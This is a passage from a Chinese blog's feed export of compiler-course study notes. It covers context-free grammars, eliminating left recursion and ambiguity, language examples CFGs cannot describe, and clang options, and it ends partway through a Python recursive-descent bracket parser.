src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E6%96%87%E6%B3%95/20230828205643806820_805_20221201120122982777_294_image-20221115093159798.png" alt="image-20221115093159798"><figcaption aria-hidden="true">image-20221115093159798</figcaption></figure><p>“不包含子串011的01串，3显然不需要包含进CFG”</p><h2 id="cfg修改">CFG修改</h2><h3 id="消除二义性">消除二义性</h3><p>消除二义性没有固定的套路，建立在对文法理解的基础上。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E6%96%87%E6%B3%95/20230828205645038077_709_image-20221201134248289.png" alt="image-20221201134248289"><figcaption aria-hidden="true">image-20221201134248289</figcaption></figure><h3 id="消除左递归">消除左递归</h3><p>消除直接左递归很简单，在龙书第二章有所讲述。下面一个消除间接左递归的例子：</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E6%96%87%E6%B3%95/20230828205646564550_859_20221201120126538302_916_image-20221115094108795.png" alt="image-20221115094108795" width="67%" height="67%"></p><h3 id="消除空字">消除空字</h3><p>消除空字需要注意的一点时一定要替换“干净”，即所有与含有空字的非终结符文法定义相关的条目都要考虑并替换</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E6%96%87%E6%B3%95/20230828205648003494_548_20221201120128030368_860_image-20221115094610591.png" alt="image-20221115094610591"><figcaption aria-hidden="true">image-20221115094610591</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E6%96%87%E6%B3%95/20230828205649177202_905_20221201120129388514_865_image-20221115094838176.png" alt="image-20221115094838176"><figcaption aria-hidden="true">image-20221115094838176</figcaption></figure><h3 id="消除回路">消除回路</h3><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E6%96%87%E6%B3%95/20230828205650398355_928_20221201120130871049_366_image-20221115095219937.png" alt="image-20221115095219937"><figcaption aria-hidden="true">image-20221115095219937</figcaption></figure><h3 id="左公因子提取">左公因子提取</h3><p><span class="math inline">\(A \rightarrow \alpha \beta_1 \mid \alpha\beta_2\)</span> 改写为： <span class="math inline">\(\mathrm{A}\rightarrow \alpha \mathrm{A}^{\prime}\)</span> <span class="math inline">\(A^{\prime} \rightarrow \beta_1 \mid\beta_2\)</span></p><p>例子：</p><p><span class="math inline">\(\mathrm{S} \rightarrow\mathrm{iEtS}|\mathrm{iEtSeS}| \mathrm{a}\)</span> <span class="math inline">\(\mathrm{E} \rightarrow \mathrm{b}\)</span> i <span class="math inline">\(\rightarrow\)</span> if, t$ $ then, e <span class="math inline">\(\rightarrow\)</span> else, E <span class="math inline">\(\rightarrow\)</span> 表达式, S <span class="math inline">\(\rightarrow\)</span> 语句 改写为: <span class="math inline">\(\mathrm{S} \rightarrow \mathrm{iEtSS}\)</span> ' |a <span class="math inline">\(\mathrm{S}^{\prime} \rightarrow\mathrm{eS} \mid \varepsilon\)</span> <span class="math inline">\(\mathrm{E} \rightarrow \mathrm{b}\)</span></p><h2 id="cfg无法描述的语言结构">CFG无法描述的语言结构</h2><p>(重在理解)</p><p>例1: <span class="math inline">\(\mathrm{L}_1=\left\{\mathrm{wcw}\mid \mathrm{w} \in(\mathrm{a} \mid \mathrm{b})^*\right\}\)</span></p><p>检查标识符(w)必须在使用之前定义</p><p>语义分析阶段才能完成的事情</p><p>例2: <span class="math inline">\(\mathrm{L}_2=\left\{a^{\mathrm{n}}b^m c^n d^m \mid n \geqslant 1\right.\)</span> 且 <span class="math inline">\(\left.m \geqslant 1\right\}\)</span></p><p>检查函数的形参 (声明) 与实参 (调用)的数目是否匹配</p><p>语法定义一般不考虑参数数目</p><p>例3: <span class="math inline">\(\mathrm{L}_3=\left\{\mathrm{a}^{\mathrm{n}}b^{\mathrm{n}} \mathrm{c}^{\mathrm{n}} \mid \mathrm{n} \geq0\right\}\)</span></p><p>排版软件, 文本加下划线: <span class="math inline">\(\mathrm{n}\)</span> 个字符, <span class="math inline">\(\mathrm{n}\)</span> 个退格, <span class="math inline">\(\mathrm{n}\)</span> 个下划线</p><p><span class="math inline">\(\mathrm{a}^{\mathrm{n}}b^{\mathrm{n}}\)</span>容易描述(S→aSb)</p><p>另一种方式: 字符一退格一下划线三元 组序列, <span class="math inline">\((\mathrm{abc})^*\)</span>就可以描述了</p><p><strong>可以描述的类似文法：</strong></p><p><span class="math inline">\(\mathrm{L}_1{}^{\prime}=\left\{\mathrm{w} \mathrm{c}\mathrm{w}^{\mathrm{R}}\mathrm{w} \in(\mathrm{a} \mid \mathrm{b})^*,\mathrm{w}^{\mathrm{R}}\right.\)</span> 为<span class="math inline">\(\mathrm{w}\)</span>的反转 <span class="math inline">\(\}\)</span></p><p><span class="math inline">\(\mathrm{S} \rightarrow\mathrm{aSa}|\mathrm{bSb}| \mathrm{c}\)</span> <span class="math inline">\(\mathrm{L}_2{}^{\prime}=\left\{\mathrm{a}^{\mathrm{n}} \mathrm{b}^{\mathrm{m}}\mathrm{c}^{\mathrm{m}} \mathrm{d}^{\mathrm{n}} \mid \mathrm{n}\geqslant 1\right.\)</span> 且 <span class="math inline">\(\left.\mathrm{m} \geqslant 1\right\}\)</span></p><p>和考试题类似，中心对称的，先处理中间</p><p><span class="math inline">\(\mathrm{S} \rightarrow\mathrm{aSd}|\mathrm{aAd} \quad \mathrm{A} \rightarrow \mathrm{bAc}|\mathrm{bc}\)</span></p><p><span class="math inline">\(\mathrm{L}_2{}^=\left\{\mathrm{a}^{\mathrm{n}} b^{\mathrm{n}}\mathrm{c}^{\mathrm{m}} \mathrm{d}^{\mathrm{m}} \mid \mathrm{n}\geqslant 1\right.\)</span> 且 <span class="math inline">\(\left.m\geqslant 1\right\}\)</span></p><p>轴对称的，先处理两边</p><p><span class="math inline">\(\mathrm{S} \rightarrow \mathrm{AB} \quad\mathrm{A} \rightarrow \mathrm{aAb}|\mathrm{ab} \quad \mathrm{B}\rightarrow \mathrm{cBd}| \mathrm{cd}\)</span></p><p><span class="math inline">\(\mathrm{L}_3{}^{\prime}=\left\{\mathrm{a}^{\mathrm{n}} \mathrm{b}^{\mathrm{n}} \mid\mathrm{n} \geq 1\right\}\)</span></p><p><span class="math inline">\(\mathrm{S} \rightarrow \mathrm{aSb} \mid\mathrm{ab}\)</span></p><p>PS：证明<span class="math inline">\(\mathrm{L}_3{}^{\prime}\)</span>不能用正则表达式表示</p><p>可以考虑证明它不能使用DFA进行表示。证明的关键就是定义”DF“(确定，有穷):</p><p>假定存在DFA D接受 <span class="math inline">\(\mathrm{L}_3{}^{\prime}\)</span>, 其状态数为 <span class="math inline">\(k\)</span>(有穷)。 设状态 <span class="math inline">\(\mathrm{s}_0, \mathrm{~s}_1, \ldots,\mathrm{s}_{\mathrm{k}}\)</span> 为读入 <span class="math inline">\(\varepsilon, \mathrm{a}, \mathrm{aa}, \ldots,\mathrm{a}^{\mathrm{k}}\)</span> 后的状态 <span class="math inline">\(\Rightarrow \mathrm{s}_{\mathrm{i}}\)</span>为读入 <span class="math inline">\(\mathrm{i}\)</span> 个 <span class="math inline">\(\mathrm{a}\)</span> 达到的状态 <span class="math inline">\((0 \leqslant \mathrm{i} \leqslant\mathrm{k})\)</span> 总状态数 <span class="math inline">\(\mathrm{k}\rightarrow \mathrm{s}_0, \mathrm{~s}_1, \ldots,\mathrm{s}_{\mathrm{k}}\)</span> 中至少有两个相同状态, 不妨设为 <span class="math inline">\(s_i 、 s_j ， i&lt;j\)</span></p><p><span class="math inline">\(a^i b^i \in L_3 \rightarrow \Rightarrows_i\left(s_j\right)\)</span> 到终态路径标记为 <span class="math inline">\(b^i\)</span> <span class="math inline">\(\rightarrow\)</span> 初态 <span class="math inline">\(\rightarrow\)</span> 终态还有标为 <span class="math inline">\(a^i b^i\)</span> 的路径 <span class="math inline">\(\rightarrow D\)</span> 接受 <span class="math inline">\(a^i b^i\)</span>, 与”D(确定)“矛盾！</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E6%96%87%E6%B3%95/20230828205651744661_709_20221201120132392020_526_image-20221115103746485.png" alt="image-20221115103746485"><figcaption aria-hidden="true">image-20221115103746485</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编译原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>编译原理一二章</title>
    <link href="/posts/34738/"/>
    <url>/posts/34738/</url>
    
    <content type="html"><![CDATA[<h2 id="编译原理概述">编译原理概述</h2><p class="note note-info">此部分对应于龙书第一二章</p><h3 id="lec1从代码到可执行文件">Lec1从代码到可执行文件</h3><h4 id="编译器要做哪些事情">编译器要做哪些事情？</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211119353519_528_20221008190733227216_229_image-20220929095525300.png" alt="image-20220929095525300"><figcaption aria-hidden="true">image-20220929095525300</figcaption></figure><h5 id="一些gcc编译选项">一些gcc编译选项</h5><h6 id="actions"><a href="https://clang.llvm.org/docs/ClangCommandLineReference.html#id6">Actions</a></h6><p>The action to perform on the input.</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-gdoueqlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-gdoueqlmrh9u69"><pre><code class="hljs shell">-E, --preprocessOnly run the preprocessor-S, --assembleOnly run preprocess and compilation steps-c, --compileOnly run preprocess, compile, and assemble steps-emit-llvmUse the LLVM representation for assembler and object files</code></pre></div></div><h6 id="compilation-flags"><a href="https://clang.llvm.org/docs/ClangCommandLineReference.html#id7">Compilationflags</a></h6><p>Flags controlling the behavior of Clang during compilation. Theseflags have no effect during actions that do not perform compilation.</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-i3eqetlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-i3eqetlmrh9u69"><pre><code class="hljs shell">-Xassembler &lt;arg&gt;`Pass &lt;arg&gt; to the assembler-Xclang &lt;arg&gt;, -Xclang=&lt;arg&gt;Pass &lt;arg&gt; to clang -cc1</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211120797372_244_20221008190735472529_960_image-20220920154109066.png" alt="image-20220920154109066"><figcaption aria-hidden="true">image-20220920154109066</figcaption></figure><p>上面是<strong>抽象语法树</strong>：简化，只包含程序中出现的单词</p><p>下面是<strong>语义分析树（具体语法树）</strong>：完整，还包含抽象出的语法概念</p><h5 id="对过程的相关理解">对过程的相关理解</h5><p class="note note-info">C++编译器检查相容类型计算是否合规是在语义分析阶段编译器识别出标识符是在词法分析阶段</p><p class="note note-warning">C++编译器过滤注释是在_<strong>阶段。答案是词法分析，但实践表明预处理阶段就已经过滤注释了。C++编译器检查数组下标越界是在</strong>_阶段 C++并不会检查数组下标越界。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211121869942_277_20221008190736776341_330_image-20220920162038518.png" alt="image-20220920162038518"><figcaption aria-hidden="true">image-20220920162038518</figcaption></figure><p>显然符号表中不会存变量值，因为变量值在运行时才会确定。</p><p class="note note-info">符号表是在词法分析阶段创建的。(习题)</p><p>但是据龙书：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211123322922_438_20221008190738941427_725_image-20221004193852281.png" alt="image-20221004193852281"><figcaption aria-hidden="true">image-20221004193852281</figcaption></figure><h3 id="lec2-构造一个简单的编译器">Lec2 构造一个简单的编译器</h3><h4 id="上下文无关文法">上下文无关文法</h4><h5 id="感性理解">感性理解</h5><p>BNF 是一种<strong>上下文无关文法</strong>，那什么是上下文相关文法(CSG呢？</p><p>CSG 在 CFG的基础上进一步放宽限制。</p><p>产生式的左手边也可以有终结符和非终结符。左手边的终结符就是“上下文”的来源。也就是说匹配的时候不能光看当前匹配到哪里了，还得看当前位置的左右到底有啥（也就是上下文是啥），上下文在这条规则应用的时候并不会被消耗掉，只是“看看”。</p><h5 id="形式化定义">形式化定义</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211124604391_685_20221008190740496671_209_image-20220927144906987.png" alt="image-20220927144906987"><figcaption aria-hidden="true">image-20220927144906987</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211126622831_534_20221008190741666990_453_image-20220927144926174.png" alt="image-20220927144926174"><figcaption aria-hidden="true">image-20220927144926174</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211127927939_512_20221008190742819758_795_image-20220927144938067.png" alt="image-20220927144938067"><figcaption aria-hidden="true">image-20220927144938067</figcaption></figure><p>对闭包的理解</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211128816534_639_20221008190743880629_933_image-20220927144950874.png" alt="image-20220927144950874"><figcaption aria-hidden="true">image-20220927144950874</figcaption></figure><p>正闭包也叫正则闭包</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211130464043_550_20221008190746344914_185_image-20220927145026025.png" alt="image-20220927145026025"><figcaption aria-hidden="true">image-20220927145026025</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211132375050_774_20221008190747551802_775_image-20221004164810301.png" alt="image-20221004164810301"><figcaption aria-hidden="true">image-20221004164810301</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211133521440_898_20221008190748466161_250_image-20220927150609696.png" alt="image-20220927150609696"><figcaption aria-hidden="true">image-20220927150609696</figcaption></figure><p>在词法分析阶段，所有的expr都是同等对待的，因此不需要加下标</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211134687341_281_20221008190749626754_765_image-20220927150731839.png" alt="image-20220927150731839"><figcaption aria-hidden="true">image-20220927150731839</figcaption></figure><p>idlist也可用右递归表示。两种方式等价，但生成的语法分析树不一样。</p><p>另外一种设计方案</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211135780921_381_20221008190750857129_584_image-20220927155732458.png" alt="image-20220927155732458" width="50%" height="50%"></p><h5 id="二义性语法和非二义性语法">二义性语法和非二义性语法</h5><p>非二义性语法</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211137013371_846_20221008190751862164_535_image-20220927154102321.png" alt="image-20220927154102321"><figcaption aria-hidden="true">image-20220927154102321</figcaption></figure><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211139474241_687_20221008190753296213_768_image-20220927154131189.png" alt="image-20220927154131189" width="50%" height="50%"></p><p>采用二义性语法，则会产生歧义问题，同一段代码在不同编译器上产生不一样的结果，显然是我们不想看到的</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211140874074_275_20221008190754314719_452_image-20220927154314035.png" alt="image-20220927154314035"><figcaption aria-hidden="true">image-20220927154314035</figcaption></figure><p>但是在一定的场合下，通过设计合理的语法分析算法，我们是容许一定的二义性的，因为可以减小语法分析树的复杂性。</p><p>文法左递归，体现出运算符左结合，右递归则是右结合。</p><p>一个右结合的例子</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211141917463_901_20221008190755524185_246_image-20220927155426816.png" alt="image-20220927155426816" width="50%" height="50%"></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211143701152_922_20221008190756637988_463_image-20220927161055294.png" alt="image-20220927161055294"><figcaption aria-hidden="true">image-20220927161055294</figcaption></figure><p>注意：不要跳级！左结合的，且从左往右替换。</p><h5 id="练习">练习</h5><h6 id="推导练习">推导练习</h6><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211145333372_860_20221008190758243317_959_image-20220927161040537.png" alt="image-20220927161040537"><figcaption aria-hidden="true">image-20220927161040537</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211146677523_971_20221008190759789619_359_image-20220928164050330.png" alt="image-20220928164050330"><figcaption aria-hidden="true">image-20220928164050330</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211150596966_916_20221008190801270074_244_image-20220928164220732.png" alt="image-20220928164220732"><figcaption aria-hidden="true">image-20220928164220732</figcaption></figure><ol type="1"><li>S -&gt; 0 S 1 | 0 1</li><li>S -&gt; + S S | - S S | a</li><li>S -&gt; S ( S ) S | ε</li><li>S -&gt; a S b S | b S a S | ε</li></ol><p>生成的语言：</p><ol type="1"><li><p>L = {0<sup>n</sup>1<sup>n</sup> | n&gt;=1}</p></li><li><p>L = {支持加法和减法的表达式的前缀表达形式}</p></li><li><p>L = {匹配括号的任意排列和嵌套的括号串，包括 ε}</p><p>()() (()())等</p><p>有二义性：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211152198729_696_20221025232537498298_547_2.2.3-3.png" alt="2.2.3-3"><figcaption aria-hidden="true">2.2.3-3</figcaption></figure></li><li><p>L = {数量相同的a和b组成的符号串，包括 ε}</p></li></ol><p class="note note-warning">一个文法有二义性不一定就有两个推导！但一定有两课语法树</p><p><a href="https://blog.csdn.net/severestcritic/article/details/109816062?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-109816062-blog-88792616.pc_relevant_aa&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-109816062-blog-88792616.pc_relevant_aa&amp;utm_relevant_index=1">证明语法具有二义性的方法</a></p><h6 id="构建练习">构建练习</h6><p>①</p><p>通常左递归对应左结合，右递归对应右结合。</p><p>比如对于标识符列表：</p><ol type="1"><li>list -&gt; list , id | id</li><li>list -&gt; id , list | id</li></ol><p>1是左结合的，2是右结合的。</p><p>②</p><ol type="1"><li><p>证明：用下面文法生成的所有二进制串的值都能被3整除。`</p><p>num -&gt; 11 | 1001 | num 0 | num num</p><p>符合该文法的二进制串一定是由任意数量的 11，1001 和 0组成的最左位不为0的序列</p><p>该序列的十进制和为： <span class="math display">\[sum =\Sigma_n\left(2^1+2^0\right) *2^n+\Sigma_m\left(2^3+2^0\right) *2^m\\=\Sigma_n 3*2^n+\Sigma_m 9 * 2^m\]</span></p><p>显然是能被3整除的</p></li><li><p>上面的文法是否能生成所有能被3整除的二进制串？</p><p>不能。二进制串10101，数值为21，可被3整除，但无法由文法推导出。</p></li></ol><h4 id="语法制导翻译">语法制导翻译</h4><p>构造翻译模式，中缀-&gt;后缀构造9-5+2的带语义动作的语法分析树，即输出其后缀表达式95-2+</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211153069316_794_20221008190802895392_835_image-20220927164002512.png" alt="image-20220927164002512"><figcaption aria-hidden="true">image-20220927164002512</figcaption></figure><p>按深度优先遍历即可打印（翻译）出后缀表达式</p><h4 id="语法分析">语法分析</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211154812241_599_20221008190804367395_700_image-20221004152318374.png" alt="image-20221004152318374"><figcaption aria-hidden="true">image-20221004152318374</figcaption></figure><h5 id="自顶向下构造">自顶向下构造</h5><h6 id="平凡算法扫描输入分析">平凡算法：扫描输入分析</h6><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211203906407_721_20221008190808051693_827_image-20221004153229852.png" alt="image-20221004153229852"><figcaption aria-hidden="true">image-20221004153229852</figcaption></figure><h6 id="优化预测分析">优化：预测分析</h6><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211206522350_121_20221008190811525061_463_image-20221004152448359.png" alt="image-20221004152448359"><figcaption aria-hidden="true">image-20221004152448359</figcaption></figure><p><span class="math inline">\(lookahead\)</span>在构造编译器的时候就可以完成。</p><p>实例分析</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211209148291_380_20221008190813022183_796_image-20221004152827769.png" alt="image-20221004152827769"><figcaption aria-hidden="true">image-20221004152827769</figcaption></figure><p>对于<span class="math inline">\(simple\)</span>类似构造方法。</p><p><span class="math inline">\(lookahead\)</span>怎么构造？</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211210810779_780_20221008190816136501_201_image-20221004153753520.png" alt="image-20221004153753520"><figcaption aria-hidden="true">image-20221004153753520</figcaption></figure><p>总体思路是什么，还有什么问题？</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211212658010_201_20221008190818280251_227_image-20221004154007046.png" alt="image-20221004154007046"><figcaption aria-hidden="true">image-20221004154007046</figcaption></figure><h5 id="左递归问题">左递归问题</h5><p>针对上面的预测分析法，我们发现：左递归会导致递归下降程序无限循环以及预测分析法的失效。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-3gvbwslmrh9u69"></i><span>c</span><div class="collapse show" id="collapse-3gvbwslmrh9u69"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">A</span><span class="hljs-params">()</span>{    <span class="hljs-keyword">switch</span>(lookahead){        <span class="hljs-keyword">case</span> a:            A();match(a);<span class="hljs-keyword">break</span>;        <span class="hljs-keyword">case</span> b:            match(b):<span class="hljs-keyword">break</span>;        <span class="hljs-keyword">default</span>:            report(<span class="hljs-string">"syntax error"</span>)    }}</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211214168581_153_20221008190819993463_865_image-20221004160548627.png" alt="image-20221004160548627"><figcaption aria-hidden="true">image-20221004160548627</figcaption></figure><p>怎么消除？</p><p>固定的算法：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211215878429_716_20221008190821656013_971_image-20221004160612826.png" alt="image-20221004160612826"><figcaption aria-hidden="true">image-20221004160612826</figcaption></figure><p>理解：<span class="math inline">\(A=\beta \alpha \alpha...\)</span></p><p>采用右递归进行翻译</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211217282590_960_20221008190823148967_751_image-20221004161628877.png" alt="image-20221004161628877"><figcaption aria-hidden="true">image-20221004161628877</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211218858247_264_20221008190827034211_692_image-20221004161643180.png" alt="image-20221004161643180"><figcaption aria-hidden="true">image-20221004161643180</figcaption></figure><h5 id="练习-1">练习</h5><p>构造 S -&gt; S ( S ) S | ε 的语法分析器</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-bnvn6tlmrh9u69"></i><span>python</span><div class="collapse show" id="collapse-bnvn6tlmrh9u69"><pre><code class="hljs python"><span class="hljs-comment"># a program to test lookahead grammar analysis</span><span class="hljs-comment"># S -&gt; S ( S ) S | ε to match brackets</span><span class="hljs-comment"># it can be simplified to S -&gt; ( S ) S | ε</span><span class="hljs-keyword">class</span> <span class="hljs-title class_">Matcher</span>:    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, string</span>):        self.string = string        self.index = <span class="hljs-number">0</span>        self.lookahead = self.string[self.index] <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.string) &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-string">""</span>        self.process = <span class="hljs-string">"S"</span>        self.lookaheads = []    <span class="hljs-keyword">def</span> <span class="hljs-title function_">match</span>(<span class="hljs-params">self, char</span>):        <span class="hljs-keyword">if</span> char == <span class="hljs-string">''</span>:            <span class="hljs-keyword">return</span>        <span class="hljs-keyword">elif</span> char == self.lookahead:            self.index += <span class="hljs-number">1</span>            <span class="hljs-keyword">if</span> self.index &lt; <span class="hljs-built_in">len</span>(self.string):                self.lookahead = self.string[self.index]            <span class="hljs-keyword">else</span>:                self.lookahead = <span class="hljs-string">""</span>        <span class="hljs-keyword">else</span>:            <span class="hljs-built_in">print</span>(<span class="hljs-string">"Not matched"</span>)            exit(<span class="hljs-number">1</span>)    <span class="hljs-keyword">def</span> <span class="hljs-title function_">S</span>(<span class="hljs-params">self</span>):        self.lookaheads.append(self.lookahead)        <span class="hljs-keyword">if</span> self.lookahead == <span class="hljs-string">'('</span>:            self.process = self.process.replace(<span class="hljs-string">"S"</span>, <span class="hljs-string">"( S ) S"</span>, <span class="hljs-number">1</span>)            <span class="hljs-built_in">print</span>(self.process)            self.<span class="hljs-keyword">match</span>(<span class="hljs-string">'('</span>)            self.S()            self.<span 